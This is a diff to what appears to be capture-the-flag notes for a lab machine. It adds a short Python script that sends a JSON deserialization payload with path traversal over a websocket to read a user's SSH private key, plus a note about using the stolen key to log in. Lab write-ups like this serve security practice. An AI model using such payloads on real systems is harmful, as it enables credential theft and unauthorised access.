@@ -22,7 +22,24 @@ order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../.
 
 python3 original.py
 
-read ssh keys and ssh -i id_rsa login
+#!/usr/bin/python3
+
+import websocket, json
+
+ws = websocket.WebSocket()
+
+ws.connect("ws://10.129.23.1:5000/")
+
+order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
+data = str(json.dumps(order))
+
+ws.send(data)
+
+result = ws.recv()
+print(result) 
+
+
+read ssh keys and ssh -i id_rsa login for foothold
 
 
 
